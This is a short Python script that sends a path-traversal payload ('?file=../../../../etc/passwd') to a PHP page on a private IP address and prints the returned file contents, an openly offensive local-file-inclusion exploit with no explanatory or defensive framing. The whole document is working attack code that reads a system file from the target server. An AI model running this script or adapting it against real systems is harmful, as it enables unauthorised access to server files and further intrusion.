import httpx
# URL of the vulnerable PHP page
url = "http://192.168.8.129:8780/vulnerable_page.php"
payload = "?file=../../../../etc/passwd"  
try:
    # Create an HTTP client with necessary configurations
    with httpx.Client(http2=True, verify=False) as client:
        # Send GET request with the payload
        response = client.get(url + payload, timeout=5)
        # Check for a successful response
        if response.status_code == 200:
            print("Potentially successful attack!")
            print("\nResponse content:")
            print(response.text)  # Display the contents of the targeted file (e.g., /etc/passwd)
        else:
            print(f"Failed to exploit. Status code: {response.status_code}")
except httpx.RequestError as e:
    print(f"An error occurred: {e}")